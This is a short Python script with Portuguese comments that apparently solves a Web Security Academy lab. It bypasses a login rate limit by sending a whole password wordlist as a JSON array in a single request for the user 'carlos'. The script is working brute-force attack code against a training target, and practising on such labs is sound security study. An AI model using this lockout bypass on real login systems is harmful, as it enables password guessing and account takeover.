import requests

# A aplicação bloqueia o IP a cada 3 tentativas falhas de login,
# tentar alterar para IPs aleatórios no cabeçalho "X-Forwarded-For" não funciona,
# e ao logar em uma conta existente, o contador de falhas de login não é zerado.
# VULNERABILIDADE
# A aplicação deveria contar cada tentativa de senha como 1, mas conta cada request como 1
# então, basta enviar uma única request com múltiplas passwords 

with open('wordlist_pass.txt', 'r') as arquivo_pass:
    list_pass = arquivo_pass.read().splitlines()

url = 'https://0a53003d04854ccb8103022100490046.web-security-academy.net/login'
data = {
    "username": "carlos",
    "password": list_pass
}
response = requests.post(url, json=data)
print(response.text)